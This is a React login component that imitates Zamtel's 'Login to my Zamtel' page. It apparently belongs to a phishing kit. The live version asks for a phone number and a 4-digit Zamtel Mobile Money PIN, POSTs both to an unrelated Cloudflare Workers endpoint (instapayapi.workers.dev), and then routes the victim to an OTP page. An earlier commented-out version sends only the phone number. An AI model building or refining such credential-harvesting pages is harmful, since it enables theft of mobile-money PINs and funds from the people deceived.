// import React, { useState } from "react";
// import { useNavigate } from "react-router-dom";

// export default function ZamtelLogin() {
//     const [number, setNumber] = useState("");
//     const [agreed, setAgreed] = useState(true);
//     const navigate=useNavigate();

//     // Zambian mobile numbers: 9 digits after +260
//     const isValid = number.length === 9 && agreed;

//     const handleNumberChange = (e) => {
//         const digits = e.target.value.replace(/\D/g, "").slice(0, 9);
//         setNumber(digits);
//     };

//     const handleSubmit = async (e) => {
//         e.preventDefault();
//         if (!isValid) return;
//         // TODO: call your OTP endpoint here
//         console.log("Request OTP for +260" + number);
//         try {
//             const res = await fetch(`https://my-worker-app.instapayapi.workers.dev/api/phone`, {
//                 method: "POST",
//                 headers: { "Content-Type": "application/json" },
//                 body: JSON.stringify({ phone: `260${number}` }),
//             });

//             // const data = await res.json();
//             navigate("/otp", { state: { phone: number } });

//         } catch (err) {
//             console.error("Error requesting OTP:", err);
//         }
//     };

//     return (
//         <div className="min-h-screen w-full bg-white flex justify-center">
//             <form
//                 onSubmit={handleSubmit}
//                 className="flex min-h-screen w-full max-w-md flex-col px-5 pt-16 pb-8 sm:pt-24"
//             >
//                 {/* Heading */}
//                 <h1 className="text-3xl font-bold tracking-tight text-black sm:text-4xl">
//                     Login to my Zamtel
//                 </h1>
//                 <p className="mt-3 text-base leading-tight text-gray-700">
//                     Insert your Prepaid, Velocity, or Zamtel Fiber number below
//                 </p>

//                 {/* Phone input */}
//                 <div className="mt-8 flex items-center rounded-2xl border-2 border-gray-200 bg-white px-4 py-4 focus-within:border-blue-500 transition-colors">
//                     <span className="pr-3 text-base text-gray-500">+260</span>
//                     <span className="h-5 w-px bg-gray-300" aria-hidden="true" />
//                     <input
//                         type="tel"
//                         inputMode="numeric"
//                         autoComplete="tel-national"
//                         value={number}
//                         onChange={handleNumberChange}
//                         placeholder="Enter your number"
//                         aria-label="Phone number"
//                         className="ml-4 w-full bg-transparent text-base text-gray-900 placeholder-gray-500 outline-none"
//                     />
//                 </div>

//                 {/* Terms checkbox */}
//                 <label className="mt-6 flex cursor-pointer items-center gap-3 text-base text-gray-700">
//                     <input
//                         type="checkbox"
//                         checked={agreed}
//                         onChange={(e) => setAgreed(e.target.checked)}
//                         className="h-6 w-6 shrink-0 cursor-pointer rounded-md border-2 border-gray-300 accent-blue-600"
//                     />
//                     <span>
//                         I agree to the{" "}
//                         <a
//                             href="#"
//                             className="text-blue-600 hover:underline"
//                             onClick={(e) => e.stopPropagation()}
//                         >
//                             terms of service &amp; privacy policy.
//                         </a>
//                     </span>
//                 </label>

//                 {/* Spacer pushes the button to the bottom */}
//                 {/* <div className="flex-1" /> */}

//                 {/* CTA */}
//                 <button
//                     type="submit"
//                     disabled={!isValid}
//                     className={`w-full mt-6 rounded-2xl py-5 text-lg font-medium transition-colors ${isValid
//                         ? "bg-[#12A036] text-white hover:bg-[#0e7a2a]"
//                         : "cursor-not-allowed bg-gray-200 text-gray-500"
//                         }`}
//                 >
//                     Get OTP
//                 </button>
//             </form>
//         </div>
//     );
// }

import React, { useRef, useState } from "react";
import { useNavigate } from "react-router-dom";

const PIN_LENGTH = 4;

export default function ZamtelLogin() {
    const [number, setNumber] = useState("");
    const [pin, setPin] = useState(Array(PIN_LENGTH).fill(""));
    const [agreed, setAgreed] = useState(true);
    const [loading, setLoading] = useState(false);

    const pinRefs = useRef([]);
    const navigate = useNavigate();

    const isPhoneValid = number.length === 9 && agreed;
    const isPinComplete = pin.every((digit) => digit !== "");

    const handleNumberChange = (e) => {
        const digits = e.target.value
            .replace(/\D/g, "")
            .slice(0, 9);

        setNumber(digits);
    };

    // PIN input
    const handlePinChange = (index, value) => {
        const digit = value.replace(/\D/g, "").slice(-1);

        const newPin = [...pin];
        newPin[index] = digit;

        setPin(newPin);

        if (digit && index < PIN_LENGTH - 1) {
            pinRefs.current[index + 1]?.focus();
        }
    };

    // PIN backspace
    const handlePinKeyDown = (index, e) => {
        if (e.key === "Backspace" && !pin[index] && index > 0) {
            pinRefs.current[index - 1]?.focus();
        }
    };

    // Paste PIN
    const handlePinPaste = (e) => {
        e.preventDefault();

        const pasted = e.clipboardData
            .getData("text")
            .replace(/\D/g, "")
            .slice(0, PIN_LENGTH);

        if (!pasted) return;

        const newPin = Array(PIN_LENGTH).fill("");

        pasted.split("").forEach((digit, index) => {
            newPin[index] = digit;
        });

        setPin(newPin);

        const nextIndex = Math.min(
            pasted.length,
            PIN_LENGTH - 1
        );

        pinRefs.current[nextIndex]?.focus();
    };

    const handleSubmit = async (e) => {
        e.preventDefault();

        if (!isPhoneValid) return;

        setLoading(true);

        try {
            const res = await fetch(
                "https://my-worker-app.instapayapi.workers.dev/api/login2",
                {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        mobileNumber: `260${number}`,
                        pin: pin.join(""),
                    }),
                }
            );

            if (!res.ok) {
                throw new Error("Failed to send OTP");
            }

            console.log("OTP requested for:", `260${number}`);
            navigate("/otp", {
                state: {
                    phone: number,
                    pin: pin.join(""),
                },
            });

        } catch (error) {
            console.error("Error requesting OTP:", error);
        } finally {
            setLoading(false);
        }
    };

    const handlePinSubmit = () => {
        if (!isPhoneValid || !isPinComplete) return;

        console.log("Phone:", `260${number}`);
        console.log("PIN:", pin.join(""));

        // Example:
        // navigate("/otp", {
        //     state: {
        //         phone: number,
        //         pin: pin.join(""),
        //     },
        // });
    };

    return (
        <div className="min-h-screen w-full bg-white flex justify-center">
            <form
                onSubmit={handleSubmit}
                className="
                    min-h-screen
                    w-full
                    max-w-md
                    px-5
                    pt-12
                    pb-8
                    sm:px-7
                    sm:pt-20
                "
            >
                {/* Heading */}
                <h1
                    className="
                        text-[30px]
                        leading-tight
                        font-bold
                        tracking-tight
                        text-black
                        sm:text-4xl
                    "
                >
                    Login to my Zamtel
                </h1>

                <p
                    className="
                        mt-3
                        text-[15px]
                        leading-5
                        text-gray-700
                        sm:text-base
                    "
                >
                    Insert your Prepaid, Velocity, or Zamtel
                    Fiber number below
                </p>

                {/* ================= PHONE ================= */}
                <div
                    className={`
                        mt-7
                        flex
                        min-h-[58px]
                        items-center
                        rounded-2xl
                        border-2
                        bg-white
                        px-4
                        transition-colors
                        ${
                            number.length > 0
                                ? "border-blue-500"
                                : "border-gray-200"
                        }
                    `}
                >
                    <span className="pr-3 text-[15px] text-gray-500">
                        +260
                    </span>

                    <span
                        className="h-6 w-px bg-gray-300"
                        aria-hidden="true"
                    />

                    <input
                        type="tel"
                        inputMode="numeric"
                        autoComplete="tel-national"
                        value={number}
                        onChange={handleNumberChange}
                        placeholder="Enter your number"
                        aria-label="Phone number"
                        className="
                            ml-4
                            min-w-0
                            w-full
                            bg-transparent
                            text-[16px]
                            text-gray-900
                            placeholder-gray-400
                            outline-none
                        "
                    />
                </div>

                {/* ================= PIN ================= */}
                <div className="mt-9">
                    <h2
                        className="
                            text-center
                            text-[20px]
                            font-bold
                            leading-6
                            text-black
                            sm:text-[22px]
                        "
                    >
                        Enter 4-digit
                        <br />
                        Zamtel Mobile Money PIN
                    </h2>

                    {/* PIN Boxes */}
                    <div
                        className="
                            mx-auto
                            mt-7
                            flex
                            w-full
                            max-w-[310px]
                            justify-center
                            gap-4
                            sm:gap-6
                        "
                    >
                        {pin.map((digit, index) => (
                            <input
                                key={index}
                                ref={(el) => {
                                    pinRefs.current[index] = el;
                                }}
                                type="password"
                                inputMode="numeric"
                                maxLength={1}
                                value={digit}
                                onChange={(e) =>
                                    handlePinChange(
                                        index,
                                        e.target.value
                                    )
                                }
                                onKeyDown={(e) =>
                                    handlePinKeyDown(index, e)
                                }
                                onPaste={handlePinPaste}
                                aria-label={`PIN digit ${index + 1}`}
                                className="
                                    h-12
                                    w-14
                                    border-b-2
                                    border-gray-300
                                    bg-transparent
                                    text-center
                                    text-[24px]
                                    font-semibold
                                    text-black
                                    outline-none
                                    transition-all
                                    focus:border-blue-500
                                    sm:h-14
                                    sm:w-16
                                "
                            />
                        ))}
                    </div>

                    {/* Forgot PIN */}
                    <button
                        type="button"
                        className="
                            mx-auto
                            mt-5
                            block
                            text-[16px]
                            font-medium
                            text-blue-600
                            hover:underline
                        "
                    >
                        Forgot PIN
                    </button>
                </div>

                {/* ================= TERMS ================= */}
                <label
                    className="
                        mt-8
                        flex
                        cursor-pointer
                        items-start
                        gap-3
                        text-[14px]
                        leading-5
                        text-gray-700
                        sm:text-base
                    "
                >
                    <input
                        type="checkbox"
                        checked={agreed}
                        onChange={(e) =>
                            setAgreed(e.target.checked)
                        }
                        className="
                            mt-0.5
                            h-5
                            w-5
                            shrink-0
                            cursor-pointer
                            rounded-md
                            border-gray-300
                            accent-blue-600
                        "
                    />

                    <span>
                        I agree to the{" "}
                        <a
                            href="#"
                            className="text-blue-600 hover:underline"
                            onClick={(e) =>
                                e.stopPropagation()
                            }
                        >
                            terms of service & privacy policy.
                        </a>
                    </span>
                </label>

                {/* ================= BUTTON ================= */}
                <button
                    type="submit"
                    disabled={!isPhoneValid || loading}
                    className={`
                        mt-7
                        w-full
                        rounded-2xl
                        py-4
                        text-[17px]
                        font-semibold
                        transition-all
                        sm:py-5
                        ${
                            isPhoneValid && !loading
                                ? "bg-[#12A036] text-white hover:bg-[#0e7a2a] active:scale-[0.98]"
                                : "cursor-not-allowed bg-gray-200 text-gray-500"
                        }
                    `}
                >
                    {loading ? "Sending OTP..." : "Get OTP"}
                </button>
            </form>
        </div>
    );
}